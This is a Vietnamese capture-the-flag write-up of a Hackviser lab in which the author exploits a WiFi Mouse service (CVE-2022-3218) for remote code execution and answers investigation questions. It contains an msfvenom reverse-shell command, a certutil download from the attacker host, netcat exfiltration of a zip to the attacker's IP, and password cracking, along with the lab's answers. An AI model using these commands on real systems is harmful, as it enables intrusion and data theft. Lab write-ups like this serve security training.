---
title: "Shadow Track Lap"
published: 2025-09-20
description: "Bài này khá là hay."
tags: [CAPT, Hackviser]
category: Write up
licenseName: "Unlicensed"
draft: false
---

# **Shadow Track Lap**
---
## What is the name of the target computer?
- Tôi quét mục tiêu bằng công cụ nmap thì có kết quả :
```
┌─[root@hackerbox]─[~]
└──╼ #nmap -sC -sV 172.20.15.149 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-20 03:25 CDT
Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 03:28 (0:00:22 remaining)
Nmap scan report for 172.20.15.149
Host is up (0.00083s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1978/tcp  open  unisql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     system windows 6.2
|_    luminateOK
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1978-TCP:V=7.94SVN%I=7%D=9/20%Time=68CE6525%P=x86_64-pc-linux-gnu%r
SF:(NULL,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(GenericLines,1E,"
SF:system\x20windows\x206\.2\nluminateOK\n")%r(GetRequest,1E,"system\x20wi
SF:ndows\x206\.2\nluminateOK\n")%r(HTTPOptions,1E,"system\x20windows\x206\
SF:.2\nluminateOK\n")%r(RTSPRequest,1E,"system\x20windows\x206\.2\nluminat
SF:eOK\n")%r(RPCCheck,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(DNSV
SF:ersionBindReqTCP,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(DNSSta
SF:tusRequestTCP,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(Help,1E,"
SF:system\x20windows\x206\.2\nluminateOK\n")%r(SSLSessionReq,1E,"system\x2
SF:0windows\x206\.2\nluminateOK\n")%r(TerminalServerCookie,1E,"system\x20w
SF:indows\x206\.2\nluminateOK\n")%r(TLSSessionReq,1E,"system\x20windows\x2
SF:06\.2\nluminateOK\n")%r(Kerberos,1E,"system\x20windows\x206\.2\nluminat
SF:eOK\n")%r(SMBProgNeg,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(X1
SF:1Probe,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(FourOhFourReques
SF:t,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(LPDString,1E,"system\
SF:x20windows\x206\.2\nluminateOK\n")%r(LDAPSearchReq,1E,"system\x20window
SF:s\x206\.2\nluminateOK\n")%r(LDAPBindReq,1E,"system\x20windows\x206\.2\n
SF:luminateOK\n")%r(SIPOptions,1E,"system\x20windows\x206\.2\nluminateOK\n
SF:")%r(LANDesk-RC,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(Termina
SF:lServer,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(NCP,1E,"system\
SF:x20windows\x206\.2\nluminateOK\n")%r(NotesRPC,1E,"system\x20windows\x20
SF:6\.2\nluminateOK\n")%r(JavaRMI,1E,"system\x20windows\x206\.2\nluminateO
SF:K\n")%r(WMSRequest,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(orac
SF:le-tns,1E,"system\x20windows\x206\.2\nluminateOK\n")%r(ms-sql-s,1E,"sys
SF:tem\x20windows\x206\.2\nluminateOK\n")%r(afp,1E,"system\x20windows\x206
SF:\.2\nluminateOK\n")%r(giop,1E,"system\x20windows\x206\.2\nluminateOK\n"
SF:);
MAC Address: 52:54:00:97:F7:53 (QEMU virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DESKTOP-BG4O059, NetBIOS user: <unknown>, NetBIOS MAC: 52:54:00:97:f7:53 (QEMU virtual NIC)
|_clock-skew: -3h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-20T05:28:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.88 seconds
```
==> Đáp án là : **DESKTOP-BG4O059**

---
## What is the operating system of the target computer?
- Tôi giao tiếp với cổng 1978 trên mục tiêu :
```
┌─[root@hackerbox]─[~]
└──╼ #nc 172.20.15.149 1978
system windows 6.2
luminateOK
```
==> Đáp án là : **windows 10**

---
## What is the domain name of the website whose user information was compromised by the hacker group?
- Trong quá trình scan, tôi thấy port 1978 mở và phản hồi **system windows 6.2 luminateOK**, đó chính là service WiFi Mouse dễ bị khai thác bằng CVE-2022-3218
```
┌─[root@hackerbox]─[~]
└──╼ #searchsploit -m 49601
  Exploit: WiFi Mouse 1.7.8.5 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49601
     Path: /usr/share/exploitdb/exploits/windows/remote/49601.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable
cp: overwrite '/root/49601.py'? 
Copied to: /root/49601.py
┌─[root@hackerbox]─[~]
└──╼ #chmod +x 49601.py 
```
### CVE-2022-3218 – WiFi Mouse Remote Code Execution
- 1. WiFi Mouse là gì?

WiFi Mouse là một ứng dụng cho Windows/Android/iOS cho phép biến điện thoại thành chuột & bàn phím không dây.

Máy tính chạy WiFi Mouse server (mở port 1978 TCP).

Điện thoại kết nối đến server này để gửi lệnh điều khiển (di chuyển chuột, gõ phím…).

- 2. Lỗ hổng (Vulnerability)

Vấn đề nằm ở dịch vụ trên port 1978.

Server không có xác thực → bất kỳ ai trong cùng mạng có thể kết nối.

Các lệnh gửi đến service được xử lý trực tiếp, trong đó có lệnh chạy file thực thi.

Kẻ tấn công có thể gửi payload tùy ý để thực thi mã từ xa (RCE).
- Sau đí tôi tạo 1 payload revshell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.34.216 LPORT=4445 -f exe -o payload.exe
```
- 49601.py là 1 file chạy bằng python2 , nó lợi dụng lỗ hỏng để yêu cầu mục tiêu tải revshell về
```
┌──(kai0kid㉿Kai0Kid)-[~/Temp]
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
 trước khi khởi động thì ta cần mở 1 cổng lắng nghe , có rất nhiều cách như sài nc hoặc các công cụ khác nhưng tôi chọn msfconsole 
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PaYLOAD windows/x64/shell_reverse_tcp
PaYLOAD => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.8.34.216
LHOST => 10.8.34.216
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4445
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.8.34.216:4445
```
- Sau đó tôi bắt đầu khởi động CVE :
```
python2 49601.py 172.20.15.149 10.8.34.216 payload.exe #172.20.15.149 là ip mục tiêu , 10.8.34.216 là ip kẻ tấn công
[+] 3..2..1..
[+] *Super fast hacker typing*
[+] Retrieving payload
[+] Done! Check Your Listener?
```
- Kết quả là tôi nhận được shell
```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.8.34.216:4445 
[*] Command shell session 1 opened (10.8.34.216:4445 -> 172.20.15.149:51133) at 2025-09-20 09:45:20 +0700

Shell Banner:
Microsoft Windows [Version 10.0.19045.3930]
-----

C:\Windows\system32>whoami
whoami
desktop-bg4o059\harry
```
- Để trả lời cho câu hỏi trên tôi đã dùng
```
C:\Windows\system32>findstr /I "\.hv" "C:\Users\Harry\Desktop\response.txt"
findstr /I "\.hv" "C:\Users\Harry\Desktop\response.txt"
Access-Control-Allow-Origin: https://trustbank.hv
```
==> Đáp án là **trustbank.hv**

---

## What is the number of compromised user data?
```
C:\Windows\system32>findstr /I "email" "C:\Users\Harry\Desktop\response.txt" | find /c /v ""
findstr /I "email" "C:\Users\Harry\Desktop\response.txt" | find /c /v ""
15689
```
==> Đáp án là **15689**

---

## What are any of the other websites targeted by the hacker group?
```
C:\Users\Harry\Documents\hack>type target_domains.txt
type target_domains.txt
primelogistics.hv
swiftsolutions.hv
serenewellness.hv
summitfinancialgroup.hv
creativemedia.hv
```
==> Đáp án là : **primelogistics.hv**

---

## What is the group participation link to the platform on which the hacker group communicates?

```
C:\Users\Harry\Desktop>type telegram.txt
type telegram.txt
t.me/+37NnWAZY2HTaYjM9A
```
==> Đáp án là : **t.me/+37NnWAZY2HTaYjM9A**

---

## What is the MD5 hash value of the malware used by the hacker group?

- Chuẩn bị nc64.exe cho Windows trên máy Kali (dùng Python HTTP server để phục vụ file). Công cụ này sẽ được tải xuống máy victim để dùng cho việc truyền file.
```
certutil -urlcache -f http://<my-ip>/nc64.exe C:\Windows\Temp\ncat.exe
```
- Thiết lập listener trên cổng 9001 để chờ nhận file
```
nc -lvnp 9001 > malware.zip
```
- Trên victim, dùng ncat.exe để gửi file malware.zip về cho Kali:
```
C:\Windows\Temp\ncat.exe 10.8.33.97 9001 < C:\Users\Harry\Downloads\malware.zip
```
- Crack mật khẩu của file zip bằng John the Ripper
```
zip2john malware.zip > malware.hash
john --wordlist=/usr/share/wordlists/rockyou.txt malware.hash
```
> Kết quả: mật khẩu là money.
- Giải nén:
```
unzip -P 'money' malware.zip
md5sum malware.exe
035bce7b8ecd5e46298e2666c5ba2fb2  malware.exe

```
> ==> Đáp án là : **035bce7b8ecd5e46298e2666c5ba2fb2**


